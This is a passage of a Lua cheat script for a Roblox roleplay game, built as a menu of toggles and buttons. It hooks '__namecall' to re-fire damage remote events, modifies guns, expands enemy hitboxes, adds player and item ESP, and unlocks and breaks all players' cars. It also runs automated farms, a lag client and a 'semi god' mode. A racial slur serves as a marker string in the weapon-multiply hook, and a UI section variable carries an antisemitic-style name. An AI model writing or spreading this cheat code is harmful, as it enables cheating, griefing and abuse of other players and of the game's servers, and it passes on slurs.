                    hrp.Transparency = var.hbetrans
                    hrp.CanCollide = false
                end
            end
        end
    end)

    Combatw.Slider("Hitbox Expander Color Blue",0,255,var.hbeblue,false,function(a)
        var.hbeblue = a
        for i,v in pairs(Players:GetPlayers()) do
            if var.HBE then
                if IsValid(v) and v ~= LocalPlayer and not v.Character:FindFirstChild("Humanoid").Sit then
                    local hrp = v.Character:FindFirstChild("HumanoidRootPart")
                    hrp.Size = Vector3.new(var.hbesize,var.hbesize,var.hbesize)
                    hrp.Color = Color3.fromRGB(var.hbered,var.hbegreen,var.hbeblue)
                    hrp.Transparency = var.hbetrans
                    hrp.CanCollide = false
                end
            end
        end
    end)
    
    -- Gun Mods
    
    local weaponmods = Main.SideTab("Weapon Mods",2.44)
    
    local Gunet = weaponmods.Section("Weapon Modifications")
    
    Gunet.Toggle("Weapon Multiplier 2",var.wwmw,function(a)
        var.wwmw = a
        togglenote("Weapon Multiplier 2",var.wwmw)
    end)
    
    Gunet.Slider("WM2 Times Multipied",1,7,var.rounds,true,function(a)
        var.rounds = a
    end)
    
    Gunet.Slider("WM2 Fire Time",0,5,var.roundtime,false,function(a)
        var.roundtime = a
    end)
    
    Gunet.Toggle("Loud Gun",var.loudaim,function(a)
        var.loudaim = a
        togglenote("Loud Gun",var.loudaim)
    end)
    
    Gunet.Slider("Loud Gun Sound",1,22,var.loudaimsound,false,function(a)
        var.loudaimsound = a
    end)
    
    Gunet.Label("Presets")
    
    Gunet.Button("Sniper Shotgun",function()
        if LocalPlayer.Backpack:FindFirstChild("Remington") or LocalPlayer.Character:FindFirstChild("Remington") then
            if LocalPlayer.Character:FindFirstChild("Remington") then
                LocalPlayer.Character:FindFirstChild("Remington").Parent = LocalPlayer.Backpack
            end
            local rem = LocalPlayer.Backpack:WaitForChild("Remington")
            rem.LocalScript:Destroy()
            require(game:GetService("ReplicatedStorage").Modules.TS.SHT).Initiate(rem, 2.1, 6, 0.4, 20, 0, 4, nil, nil, "Heavy Ammo")
            rem.Name = "[Sniper] Remington"
            rem.Parent = LocalPlayer.Character
        else
            senderror("You need a remington equipped")
        end
    end)
    
    Gunet.Button("Weapon Multiply",function()
        if IsGun(LocalPlayer) then
            local m = GetGun(LocalPlayer)
            m.Parent = LocalPlayer.Backpack
            m:FindFirstChild("LocalScript"):Clone().Parent = m
            m.Parent = LocalPlayer.Character
            m.Name = "[Multiplied] "..m.Name
            local mult
            mult = hookmetamethod(game,"__namecall",function(s,...)
                local args = {...}
                if getnamecallmethod()=="FireServer"and args[2] == 33 and args[7] == m and s:GetFullName():find("MenuActionEvent")and args[5]:GetFullName():find("Humanoid")and args[10]~="nigger"then game:GetService("ReplicatedStorage").Events.MenuActionEvent:FireServer(33,args[3],2,args[5],m:GetAttribute("Damage"),m,nil,1,"nigger")return s.FireServer(s,...)end
                return mult(s,...)
            end)
        else
            senderror("You need a gun equipped")
        end
    end)

    Gunet.Label("Tool Manipulation")

    Gunet.Button("Gentleman's Cane",function()
        if IsTool(LocalPlayer) then
            local gc = Instance.new("MeshPart")
            local gc1 = Instance.new("Sound")
            local gc2 = Instance.new("Sound")
            local gc3 = Instance.new("Part")
            local gc4 = Instance.new("Sound")
            local gc5 = Instance.new("Sound")
            local gc6 = Instance.new("Part")
            local gc7 = Instance.new("MeshPart")
            local gc8 = Instance.new("MeshPart")
            local gc9 = Instance.new("SpecialMesh")
            local gct = GetTool(LocalPlayer)
            local replicate = require(game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("TS"):WaitForChild("MELC"))
            gc.Parent = gct:WaitForChild("Handle")
            gc.Name = "blade"
            gc1.Parent = gct:WaitForChild("Handle")
            gc1.Name = "Reload"
            gc2.Parent = gct:WaitForChild("Handle")
            gc2.Name = "Swing"
            gc3.Parent = gct:WaitForChild("Handle")
            gc3.Name = "r"
            gc4.Parent = gct:WaitForChild("Handle"):WaitForChild("r")
            gc5.Parent = gct:WaitForChild("Handle")
            gc5.Name = "Reload2"
            gc6.Parent = gct:WaitForChild("Handle")
            gc6.Name = "gun"
            gc7.Parent = gct:WaitForChild("Handle")
            gc8.Parent = gct:WaitForChild("Handle")
            gc9.Parent = gct:WaitForChild("Handle"):WaitForChild("gun")
            replicate.Initiate(gct)
            gct.Name = "Gentleman's "..gct.Name
            sendnotification("Made tool Gentleman's Cane")
        else
            senderror("You need tool equipped")
        end
    end)
    
    Gunet.Button("Evermore Dagger", function()
        if IsTool(LocalPlayer) then
            local never = Instance.new("MeshPart")
            local never2 = Instance.new("Sound")
            local never1 = Instance.new("Sound")
            local never3 = Instance.new("Part")
            local nmtool = GetTool(LocalPlayer)
            if not nmtool:FindFirstChild("Handle") then never3.Parent = nmtool end
            never.Parent = nmtool:WaitForChild("Handle")
            never.Name = "Blade"
            never1.Parent = nmtool:FindFirstChild("Handle")
            never1.Name = "Swing"
            require(game:GetService("ReplicatedStorage").Modules.TS['MEL-NDE']).Initiate(nmtool)
            sendnotification("Made tool Evermore Dagger")
            nmtool.Name = "Evermore "..nmtool.Name
        else
            senderror("You need a tool equipped")
        end
    end)
    
    Gunet.Button("Thief's Cane", function()
        if IsTool(LocalPlayer) then
            local Char = LocalPlayer.Character
            local tc = Instance.new("MeshPart")
            local tc1 = Instance.new("Sound")
            local tc2 = Instance.new("Sound")
            local tc3 = Instance.new("Part")
            local tcoolt = GetTool(LocalPlayer)
            if not tcoolt:FindFirstChild("Handle") then tc3.Parent = tcoolt end
            tc.Parent = tcoolt:WaitForChild("Handle")
            tc.Name = "Cane"
            tc1.Parent = tcoolt:WaitForChild("Handle")
            tc1.Name = "Charge"
            tc2.Parent = tcoolt:WaitForChild("Handle")
            tc2.Name = "Swing"
            require(game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("TS"):WaitForChild("MEL-TC")).Initiate(tcoolt)
            tcoolt.Name = "Thief's "..tcoolt.Name
            sendnotification("Made tool Thief's Cane")
        else
            senderror("You need a tool equipped")
        end
    end)
    
    Gunet.Label("Gun Modding")

    Gunet.Button("Mod Gun",function()
        if IsGun(LocalPlayer) then
            local gun = GetGun(LocalPlayer)
            Instance.new("Sound",gun.Handle).Name = "Fire"
            Instance.new("Sound",gun.Handle).Name = "Fire2"
            Instance.new("Sound",gun.Handle).Name = "Equip"
            Instance.new("Sound",gun.Handle).Name = "Pump"
            Instance.new("Sound",gun.Handle).Name = "Reload"
            Instance.new("Sound",gun.Handle).Name = "Trigger"
            if var.Auto == "ANS" and var.animation > 3 then
                var.animation = 3
                senderror("Animation must be below 4 with Automatic")
            end
            gun.Parent = LocalPlayer.Backpack
            require(game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("TS"):WaitForChild(var.Auto)).Initiate(gun,gun:GetAttribute("ReloadTime"),gun:GetAttribute("MaxAmmo"),var.firerate,gun:GetAttribute("Damage"),var.spread,var.sound,var.animation,nil,gun:GetAttribute("AmmoType"),nil,nil,var.affect)
            if gun:FindFirstChild("LocalScript") then
                gun.LocalScript.Parent = nil
            end
            gun.Parent = LocalPlayer.Character
            sendnotification("Modded your "..gun.Name)
            gun.Name = "[Modded] "..gun.Name
        else
            senderror("Equip a gun to mod it")
        end
    end)

    Gunet.Dropdown("Affect",{"Laser Musket","Normal"},function(a)
        if a == "Laser Musket" then
            var.affect = "LMF"
        else
            var.affect = nil
        end
        sendnotification("Affect - "..tostring(var.affect))
    end)
    
    Gunet.Slider("Spread",0,25,var.spread,true,function(a)
        var.spread = a
    end)
    
    Gunet.Slider("Firerate (seconds)",0,5,var.firerate,true,function(a)
        var.firerate = a
    end)
    
    Gunet.Slider("Gun Sound",1,22,var.sound,false,function(a)
        var.sound = math.floor(a)
    end)
    
    Gunet.Slider("Gun Animation",1,5,var.animation,false,function(a)
        var.animation = math.floor(a)
    end)
    
    Gunet.Dropdown("Auto",{"Automatic","Semi Automatic","Shotgun"},function(a)
        if a == "Automatic" then
            var.Auto = "ANS"
        elseif a == "Semi Automatic" then
            var.Auto = "GNS"
        elseif a == "Shotgun" then
            var.Auto = "SHT"
        end
        sendnotification("Auto - "..var.Auto)
    end)

    -- Visuals
    
    local VisualsTab = Main.SideTab("Visuals & World",4)
    
    local Visualsw = VisualsTab.Section("UIs")
    
    Visualsw.Toggle("Health Bar",var.healthbar,function(a)
        var.healthbar = a 
        togglenote("Health Bar",var.healthbar)
    end)
    
    Visualsw.Toggle("Legacy Gun UI",var.gunui,function(a)
        var.gunui = a
        togglenote("Legacy Gun UI",var.gunui)
    end)
    
    Visualsw.Toggle("Cursor",var.cursor,function(a)
        var.cursor = a
        togglenote("Cursor",var.cursor)
    end)
    
    Visualsw.Box("Cursor ID","Decal ID",function(a)
        var.cursorid = a
        sendnotification("Cursor ID - "..var.cursorid)
    end)

    Visualsw.Label("Lighting")
    
    Visualsw.Toggle("Fullbright",var.fullb,function(a)
        var.fullb = a
        togglenote("Fullbright",var.fullb)
        if a then
            game:GetService("Lighting").GlobalShadows = false
            game:GetService("Lighting").Brightness = 2.4
        else
            game:GetService("Lighting").GlobalShadows = true
        end
    end)
    
    Visualsw.Dropdown("Weather",{"Day","Evening","Rain","Snowstorm","War","Morning","Night"},function(a)
        sendnotification("Weather - "..a)
        if a == "Day" then
            
            game.Lighting.Condition.Value = "Day"
            game:GetService("Lighting").SunRays.Intensity = 0.25
            game:GetService("Lighting").SunRays.Spread = 1
            game:GetService("Lighting").Bloom.Intensity = 0.4
            game:GetService("Lighting").Sky.SkyboxBk = "rbxassetid://501313206"
            game:GetService("Lighting").Sky.SkyboxDn = "rbxassetid://501313275"
            game:GetService("Lighting").Sky.SkyboxFt = "rbxassetid://501313069"
            game:GetService("Lighting").Sky.SkyboxLf = "rbxassetid://501313144"
            game:GetService("Lighting").Sky.SkyboxRt = "rbxassetid://501313033"
            game:GetService("Lighting").Sky.SkyboxUp = "rbxassetid://489495183"
            game:GetService("Lighting").Brightness =  1.85
            game:GetService("Lighting").FogColor =  Color3.fromRGB(255, 247, 234)
            game:GetService("Lighting").OutdoorAmbient =  Color3.fromRGB(185, 178, 167)
            game:GetService("Lighting").FogEnd = 7000
            game:GetService("Lighting").FogStart = 0
            game:GetService("Lighting").GeographicLatitude = 13
            
        elseif a == "Evening" then
            
            game.Lighting.Condition.Value = "Night"
            game:GetService("Lighting").SunRays.Intensity = 0.25
            game:GetService("Lighting").SunRays.Spread = 1
            game:GetService("Lighting").Bloom.Intensity = 0.4
            game:GetService("Lighting").Sky.SkyboxBk = "rbxassetid://271042516"
            game:GetService("Lighting").Sky.SkyboxDn = "rbxassetid://271077243"
            game:GetService("Lighting").Sky.SkyboxFt = "rbxassetid://271042556"
            game:GetService("Lighting").Sky.SkyboxLf = "rbxassetid://271042310"
            game:GetService("Lighting").Sky.SkyboxRt = "rbxassetid://271042467"
            game:GetService("Lighting").Sky.SkyboxUp = "rbxassetid://271077958"
            game:GetService("Lighting").Brightness = 0.7
            game:GetService("Lighting").FogColor = Color3.fromRGB(253, 198, 189)
            game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(124, 92, 114)
            game:GetService("Lighting").GeographicLatitude = 13
            game:GetService("Lighting").FogEnd = 7000
            game:GetService("Lighting").FogStart = 0
            
        elseif a == "Rain" then
            
            game.Lighting.Condition.Value = "Rain"
            game:GetService("Lighting").SunRays.Intensity = 0.25
            game:GetService("Lighting").SunRays.Spread = 1
            game:GetService("Lighting").Bloom.Intensity = 0.4
            game:GetService("Lighting").Sky.SkyboxBk = "rbxassetid://931421737"
            game:GetService("Lighting").Sky.SkyboxDn = "rbxassetid://931421868"
            game:GetService("Lighting").Sky.SkyboxFt = "rbxassetid://931421587"
            game:GetService("Lighting").Sky.SkyboxLf = "rbxassetid://931421672"
            game:GetService("Lighting").Sky.SkyboxRt = "rbxassetid://931421501"
            game:GetService("Lighting").Sky.SkyboxUp = "rbxassetid://931421803"
            game:GetService("Lighting").Brightness = 0
            game:GetService("Lighting").FogColor = Color3.fromRGB(193, 193, 193)
            game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(195, 195, 195)
            game:GetService("Lighting").GeographicLatitude = 337
            game:GetService("Lighting").FogEnd = 300 
            
        elseif a == "Snowstorm" then
            
            game.Lighting.Condition.Value = "Snowstorm"
            game:GetService("Lighting").SunRays.Intensity = 0.25
            game:GetService("Lighting").SunRays.Spread = 1
            game:GetService("Lighting").Bloom.Intensity = 0.4
            game:GetService("Lighting").Sky.SkyboxBk = "rbxassetid://931421737"
            game:GetService("Lighting").Sky.SkyboxDn = "rbxassetid://931421868"
            game:GetService("Lighting").Sky.SkyboxFt = "rbxassetid://931421587"
            game:GetService("Lighting").Sky.SkyboxLf = "rbxassetid://931421672"
            game:GetService("Lighting").Sky.SkyboxRt = "rbxassetid://931421501"
            game:GetService("Lighting").Sky.SkyboxUp = "rbxassetid://931421803"
            game:GetService("Lighting").Brightness = 0
            game:GetService("Lighting").FogColor = Color3.fromRGB(193, 193, 193)
            game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(195, 195, 195)
            game:GetService("Lighting").GeographicLatitude = 13
            
        elseif a == "War" then
            
            game.Lighting.Condition.Value = "Rain"
            game:GetService("Lighting").SunRays.Intensity = 0.25
            game:GetService("Lighting").SunRays.Spread = 1
            game:GetService("Lighting").Bloom.Intensity = 0.4
            game:GetService("Lighting").Sky.SkyboxBk = "rbxassetid://2506974318"
            game:GetService("Lighting").Sky.SkyboxDn = "rbxassetid://2506974575"
            game:GetService("Lighting").Sky.SkyboxFt = "rbxassetid://2506974238"
            game:GetService("Lighting").Sky.SkyboxLf = "rbxassetid://2506974390"
            game:GetService("Lighting").Sky.SkyboxRt = "rbxassetid://2506974153"
            game:GetService("Lighting").Sky.SkyboxUp = "rbxassetid://2506974467"
            game:GetService("Lighting").Brightness =  0
            game:GetService("Lighting").FogColor =  Color3.fromRGB(145, 144, 138)
            game:GetService("Lighting").OutdoorAmbient =  Color3.fromRGB(118, 115, 113)
            game:GetService("Lighting").GeographicLatitude = 13
            game:GetService("Lighting").FogEnd = 7000
            game:GetService("Lighting").FogStart = 0
            
        elseif a == "Morning" then
            
            game.Lighting.Condition.Value = "Night"
            game:GetService("Lighting").SunRays.Intensity = 0.25
            game:GetService("Lighting").SunRays.Spread = 1
            game:GetService("Lighting").Bloom.Intensity = 0.4
            game:GetService("Lighting").Sky.SkyboxBk = "rbxassetid://253027015"
            game:GetService("Lighting").Sky.SkyboxDn = "rbxassetid://253027058"
            game:GetService("Lighting").Sky.SkyboxFt = "rbxassetid://253027039"
            game:GetService("Lighting").Sky.SkyboxLf = "rbxassetid://253027029"
            game:GetService("Lighting").Sky.SkyboxRt = "rbxassetid://253026999"
            game:GetService("Lighting").Sky.SkyboxUp = "rbxassetid://253027050"
            game:GetService("Lighting").Brightness = 0.25
            game:GetService("Lighting").FogColor = Color3.fromRGB(81, 107, 112)
            game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(35, 45, 61)
            game:GetService("Lighting").GeographicLatitude = 13
            game:GetService("Lighting").FogEnd = 7000
            game:GetService("Lighting").FogStart = 0
            
        elseif a == "Night" then
            
            game.Lighting.Condition.Value = "Night"
            game:GetService("Lighting").SunRays.Intensity = 0.04
            game:GetService("Lighting").SunRays.Spread = 1.2
            game:GetService("Lighting").Bloom.Intensity = 0.4
            game:GetService("Lighting").Sky.SkyboxBk = "rbxassetid://2695798966"
            game:GetService("Lighting").Sky.SkyboxDn = "rbxassetid://213221473"
            game:GetService("Lighting").Sky.SkyboxFt = "rbxassetid://220789557"
            game:GetService("Lighting").Sky.SkyboxLf = "rbxassetid://220789543"
            game:GetService("Lighting").Sky.SkyboxRt = "rbxassetid://220789524"
            game:GetService("Lighting").Sky.SkyboxUp = "rbxassetid://220789575"
            game:GetService("Lighting").Brightness = 0
            game:GetService("Lighting").FogColor = Color3.fromRGB(31, 46, 75)
            game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(33, 40, 61)
            game:GetService("Lighting").GeographicLatitude = 13
            game:GetService("Lighting").FogEnd = 7000
            game:GetService("Lighting").FogStart = 0
            
        end
    end)

    Visualsw.Label("Cars")

    Visualsw.Button("Unlock All Cars", function()
        for i, v in ipairs(game:GetService("Workspace").Vehicles:GetChildren()) do
            v.TrueOwner.Locked.Value = false
        end
        sendnotification("Unlocked all cars")
    end)
    
    Visualsw.Button("Break All Cars", function()
        oldpos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
        for i,v in ipairs(game:GetService("Workspace").Vehicles:GetChildren()) do
            v.TrueOwner.Locked.Value = false
            Tween(v:GetModelCFrame(), .1)
            game:GetService("ReplicatedStorage").Events.InteractEvent:FireServer(v:FindFirstChild("VehicleSeat"))
            LocalPlayer.Character:FindFirstChild("Humanoid").Sit = false
            wait(.2)
        end
        LocalPlayer.Character.Humanoid.Sit = false
        Tween(oldpos, .4)
        sendnotification("Broke all cars")
    end)

    Visualsw.Label("ESPs")

    Visualsw.Dropdown(var.tracertype or "Tracer Type",{"Bottom","Mouse"},function(a)
        var.tracertype = a
    end)
    
    Visualsw.Toggle("Chams",var.Chams,function(a)
        togglenote("Chams",a)
        if a then
            for i,v in ipairs(chams:GetChildren()) do
                v.Visible = true
            end
        else
            for i,v in ipairs(chams:GetChildren()) do
                v.Visible = false
            end
        end
    end)

    Visualsw.Toggle("Tracers",var.Tracers,function(a)
        var.Tracers = a
        togglenote("Tracers",var.Tracers)
    end)

    Visualsw.Toggle("Player ESP",var.playeresp,function(a)
        togglenote("Player ESP",a)
        var.playeresp = a
        if a then
            for i,v in ipairs(Players:GetPlayers()) do
                enesp(v.Character,true)
                v.CharacterAdded:Connect(function()
                    enesp(v.Character,true)    
                end)
            end
        else
            for i,v in pairs(chams:GetDescendants()) do
                if v.Name == "player" then
                    v:Destroy()
                end
            end
        end
    end)

    Visualsw.Slider("Player ESP Size",1,100,var.playerespsize,false,function(a)
        var.playerespsize = a
    end)

    Visualsw.Toggle("Entity ESP",var.entesp,function(a)
        togglenote("Entity ESP",a)
        var.entesp = a
        if a then
            for i,v in pairs(game:GetService("Workspace").Entities:GetChildren()) do
                enesp(v)
            end
            for i,v in pairs(game:GetService("Workspace").Buildings:GetDescendants()) do
                if v.Name:find("Banker") then
                    enesp(v)
                end
            end
        else
            for i,v in pairs(chams:GetDescendants()) do
                if v.Name == "entity" then
                    v:Destroy()
                end
            end
        end
    end)

    Visualsw.Slider("Entity ESP Size",1,100,var.etnespsize,false,function(a)
        var.etnespsize = a
    end)

    Visualsw.Toggle("Money Printer ESP",var.printeresp,function(a)
        togglenote("Money Printer ESP",a)
        var.printeresp = a
        if a then
            for i,v in pairs(game:GetService("Workspace").MoneyPrinters:GetChildren()) do
                enesp(v)
            end
        else
            for i,v in pairs(chams:GetDescendants()) do
                if v.Name == "printer" then
                    v:Destroy()
                end
            end
        end
    end)

    Visualsw.Slider("Money Printer ESP Size",1,100,var.printespsize,false,function(a)
        var.printespsize = a
    end)

    Visualsw.Toggle("Material ESP",var.matesp,function(a)
        togglenote("Material ESP",a)
        var.matesp = a
        if a then
            for i,v in pairs(game:GetService("Workspace").Materials:GetChildren()) do
                enesp(v)
            end
        else
            for i,v in pairs(chams:GetDescendants()) do
                if v.Name == "material" then
                    v:Destroy()
                end
            end
        end
    end)

    Visualsw.Slider("Material ESP Size",1,100,var.matespsize,false,function(a)
        var.matespsize = a
    end)

    Visualsw.Toggle("Vehicle ESP",var.caresp,function(a)
        togglenote("Vehicle ESP",a)
        var.caresp = a
        if a then
            for i,v in pairs(game:GetService("Workspace").Vehicles:GetChildren()) do
                enesp(v)
            end
        else
            for i,v in pairs(chams:GetDescendants()) do
                if v.Name == "vehicle" then
                    v:Destroy()
                end
            end
        end
    end)

    Visualsw.Slider("Vehicle ESP Size",1,100,var.carespsize,false,function(a)
        var.carespsize = a
    end)

    Visualsw.Toggle("Loot Crate ESP",var.lootesp,function(a)
        togglenote("Loot Crate ESP",a)
        var.lootesp = a
        if a then
            for i,v in pairs(game:GetService("Workspace").Loot:GetChildren()) do
                enesp(v)
            end
        else
            for i,v in pairs(chams:GetDescendants()) do
                if v.Name == "loot" then
                    v:Destroy()
                end
            end
        end
    end)

    Visualsw.Slider("Loot Crate ESP Size",1,100,var.lootespsize,false,function(a)
        var.lootespsize = a
    end)
    
    Visualsw.Label("World")
    
    Visualsw.Toggle("Bypass Kill Barriers",var.DB,function(a)
        var.DB = a
        togglenote("Bypass Kill Barriers",var.DB)
        if a then
            game:GetService("Workspace").FallenPartsDestroyHeight = -math.huge
        else
            game:GetService("Workspace").FallenPartsDestroyHeight = 0
        end
    end)
    
    Visualsw.Toggle("Anti NLR",var.AntiNlr,function(a)
        var.AntiNlr = a
        togglenote("Anti NLR",var.AntiNlr)
        if a and game:GetService("Workspace"):FindFirstChild("NL") then
            game:GetService("Workspace"):FindFirstChild("NL"):Destroy()
        end
    end)
    
    Visualsw.Toggle("Anti Spy",var.antispy,function(a)
        var.antispy = a
        togglenote("Anti Spy",var.antispy)
    end)
    
    Visualsw.Toggle("Anti Car",var.AntiCar,function(a)
        var.AntiCar = a
        togglenote("Anti Car",var.AntiCar)
        for i,v in pairs(game:GetService("Workspace"):WaitForChild("Vehicles"):GetChildren()) do
            if a then
                v:Destroy()
            end
        end
    end)
        
    Visualsw.Label("Farms")
    
    Visualsw.Toggle("Material Farm",false,function(a)
        var.materialfarm = a
        togglenote("Material Farm",var.materialfarm)
        coroutine.wrap(function()
            if a then
                for i,v in pairs(game:GetService("Workspace").Materials:GetChildren()) do
                    if var.materialfarm then
                        v:FindFirstChild("TrueOwner"):FindFirstChild('Locked').Value = false
                        Tween(v:GetPivot(), .3)
                        wait(.1)
                        game:GetService("ReplicatedStorage").Events.PickUpEvent:FireServer(v,true)
                        for i2,v2 in pairs(game:GetService("Workspace").Buildings:GetDescendants()) do
                            if v2.Name:find("Cargo Station") then
                                wait(.1)
                                game:GetService("ReplicatedStorage").Events.MenuActionEvent:FireServer(41,v2,v)
                            end
                        end
                    end
                end
            end
        end)()
    end)
    
    Visualsw.Toggle("Destroy Printers Farm",false,function(a)
        var.dpfarm = a
        togglenote("Destroy Printers Farm",var.dpfarm)
        coroutine.wrap(function()
            if a then
                for i,v in pairs(game.Workspace.MoneyPrinters:GetChildren()) do
                    if var.dpfarm and v:IsA("Model") and v ~= nil and v:FindFirstChild("Int") and v:FindFirstChild("Int"):FindFirstChild("Uses").Value ~= 0 then
                        if LocalPlayer.Job.Value ~= "Soldier" and var.dpfarm then
                            game:GetService("ReplicatedStorage").Events.MenuEvent:FireServer(1, "Soldier")
                            wait(1)
                            game:GetService("Workspace"):WaitForChild(LocalPlayer.Name)
                        end
                        if LocalPlayer.Job.Value == "Soldier" and not huntingp then
                            huntingp = true
                            Tween(v:GetPivot(), 1)
                            wait(1.5)
                            game:GetService("ReplicatedStorage").Events.ToolsEvent:FireServer(11,v)
                        end
                        huntingp = false
                        wait(8)
                    end
                end
            end
        end)()
    end)
    
    --Visualsw.Toggle("Item Grabber",false,function(a)
       -- var.IG = a
       -- togglenote("Item Grabber",var.IG)
       -- coroutine.wrap(function()
         --   if a then
           --     for i,v in pairs(game:GetService("Workspace").Entities:GetChildren()) do
           --         local oldpos, olddb, oldnoclip, oldoutfit, oldname = LocalPlayer.Character:GetPivot(), var.DB, var.noclip, LocalPlayer.PlayerData.Outfit.Value, LocalPlayer.PlayerData.RoleplayName.Value
            --        local gr = {"InventoryEvent","InteractEvent"}
            --        if v.Name == "Gun" and v:FindFirstChildWhichIsA("MeshPart") and v:FindFirstChildWhichIsA("MeshPart").Name ~= "Box" and var.IG and not Stealing then
            --            Stealing = true
              --          game:GetService("ReplicatedStorage").Events.MenuActionEvent:FireServer(8,{"","4794183296.25766207,5359864810.51598825,4820468847.226025088,5063806496.4529381645,5343165623,23390449,3810504815.4650150168,4785505852.154987779,4785505852.1381672312",true})
               --         local m 
               --         m = workspace.Entities.ChildRemoved:Connect(function(gm)
                  --          if gm == v then
                   --             notnil = true
                   --         end 
                  --      end)
                 --       var.DB = true
                  --      var.noclip = true
                   --     Tween(CFrame.new(0,-.3,0)*v:GetPivot()*CFrame.Angles(0,math.rad(90),0),.1)
                   --     wait(.13)
                    --    repeat wait()
                          --  var.DB = true
                          --  var.noclip = true
                          --  Tween(CFrame.new(0,-.3,0)*v:GetPivot()*CFrame.Angles(0,math.rad(90),0),0.03)
                          --  wait(.05)
                          --  if LocalPlayer.PlayerGui.Client.Inventory.Slots.Amt.Text == "11/10" then
                          --  game:GetService("ReplicatedStorage").Events.InteractEvent:FireServer(v)
                          --  else
                           --     game:GetService("ReplicatedStorage").Events.InventoryEvent:FireServer(2,v)
                           -- end
                        --until not notnil or not var.IG
                      --  game:GetService("ReplicatedStorage").Events.MenuActionEvent:FireServer(8,{oldname,oldoutfit,true})
                    --    notnil = false
                     --   Stealing = false
                  --    Tween(oldpos,.1)
                --        var.DB, var.noclip = olddb, oldnoclip
              --      end
            --    end
          --  end
        --end)()
    --end)
        
    -- LocalPlayer
    
    local VisualsTab = Main.SideTab("LocalPlayer",1.90)
    
    local jew = VisualsTab.Section("LocalPlayer")
    
    jew.Button("Store all items",function()
    	local floormat = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").FloorMaterial
    	local char =  LocalPlayer.Character
    	local bp = LocalPlayer.Backpack
    	local function store()
    		if char:FindFirstChildWhichIsA"Tool" then
				char:FindFirstChildWhichIsA("Tool").Parent = bp
			end
			for i,v in pairs(bp:GetChildren()) do
				if v:IsA("Tool") then
					v.Parent = char
    				if tonumber(LocalPlayer.PlayerGui.Client.Inventory.Slots.Amt.Text:split("/")[1]) < 11 then
    					if not v.Name:find("[PERM]") and not v.Name:find("["..LocalPlayer.Job.Value.."]") then
							game:GetService("ReplicatedStorage").Events.InventoryEvent:FireServer(1)
							for i,v2 in pairs(workspace.Entities:GetChildren()) do
								if v2.Name == "Gun" and v:WaitForChild("ToolOwner").Value == LocalPlayer then
									game:GetService("ReplicatedStorage").Events.InventoryEvent:FireServer(2,v2)									
								end
							end
						end
    				else
						senderror("Inventory full cannot store")
						break
					end
				end
			end
		end
    	if IsValid(LocalPlayer) then
			if char:FindFirstChildWhichIsA("Tool") or bp:FindFirstChildWhichIsA("Tool") then
				if floormat ~= Enum.Material.Air and floormat ~= nil then
					store()
				else
					Tween(CFrame.new(175.157059, 192.564041, 107.367134, -0.385550529, 2.11825009e-05, -0.922686636, 1.28792203e-06, 1, 2.24192463e-05, 0.922686636, 7.45540319e-06, -0.385550529),.5)
					wait(.55)
					store()
				end
			else
				senderror("Must have item(s)")
			end
		else
			senderror("Must be alive")
		end
    end)
    
    jew.Button("Invisible Jetpack", function()
        jet()
        sendnotification("Equipped Invisible Jet")
    end)

    jew.Toggle("Auto Invisible Jet",var.autoinvisjet,function(a)
        var.autoinvisjet = a
        togglenote("Auto Invisible Jet",var.autoinvisjet)
        if a and not LocalPlayer.Character:FindFirstChild("Util"):FindFirstChild("Jetpack") then
           jet() 
        end
    end)
    
    jew.Toggle("Infinite Hunger",var.infhunger,function(a)
        var.infhunger = a
        togglenote("Infinite Hunger",var.infhunger)
        if a then
            var.oldhunger = LocalPlayer.PlayerData.Hunger.Value
            LocalPlayer.PlayerData.Hunger.Value = 99
        else
            LocalPlayer.PlayerData.Hunger.Value = var.oldhunger
        end
    end)
    
    jew.Toggle("Instant Lockpick",var.instalockpick,function(a)
        var.instalockpick = a
        togglenote("Instant Lockpick",var.instalockpick)
    end)
    
    jew.Toggle("Instant Drink",var.instadrink,function(a)
        var.instadrink = a
        togglenote("Instant Drink",var.instadrink)
    end)
    
    jew.Toggle("Anti Clown",var.anticlown,function(a)
        var.anticlown = a
        togglenote("Anti Clown",var.anticlown)
    end)

    jew.Toggle("Anti Crash",var.AntiLag,function(a)
        var.AntiLag = a
        togglenote("Anti Crash",var.AntiLag)
    end)
    
    jew.Button("Spy Watch Bypass",function()
        if LocalPlayer.Backpack:FindFirstChild("Spy Watch") then
            LocalPlayer.Backpack:FindFirstChild("Spy Watch").Parent = LocalPlayer.Character
        end
        wait(.1)
        if LocalPlayer.Character:FindFirstChild("Spy Watch") then
            game:GetService("ReplicatedStorage").Events.ToolsEvent:FireServer(16, true, LocalPlayer.Character:WaitForChild("Spy Watch"))
            sendnotification("Spy Watch Bypass Activated")
        else
            senderror("You need a spy watch")
        end
    end)
    
    jew.Button("Drink All Cola", function()
        for i,v in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if v.Name:find("Cola") then
                game:GetService("ReplicatedStorage").Events.ToolsEvent:FireServer(4,v)
            end
        end
        for i,v in ipairs(LocalPlayer.Character:GetChildren()) do
            if v.Name:find("Cola") then
                game:GetService("ReplicatedStorage").Events.ToolsEvent:FireServer(4,v)
            end
        end
        sendnotification("Drank All Cola")
    end)
    
    jew.Button("Hide Jobtag", function()
        if not IsSemiGodded(LocalPlayer) then
            LocalPlayer.Character:FindFirstChild("NameTag").Job:Destroy()
        end
        sendnotification("Hid Jobtag")
    end)
    
    jew.Label("Lag Client")
    
    jew.Toggle("Lag",var.lag,function(a)
        var.lag = a
        togglenote("Lag",var.lag)
    end)
    
    jew.Slider("Lag Amount",1,5000,var.laga,true,function(a)
        var.laga = a
    end)
    
    jew.KeyBind("Lag Keybind",var.lagbind,function(a)
        var.lagbind = a
    end)
    
    jew.Label("Godding")

    jew.Button("Semi God",function()
        semigod()
        sendnotification("Semi Godded")
    end)
    
    jew.Toggle("Auto Semi God",var.ASG,function(a)
        var.ASG = a
        togglenote("Auto Semi God",var.ASG)
        if a and LocalPlayer.Character:WaitForChild("Humanoid").Health <= var.asghealth then
            semigod()
        end
    end)
    
    jew.Slider("Auto Semi God Health",1,100,var.asghealth,true,function(a)
        var.asghealth = a
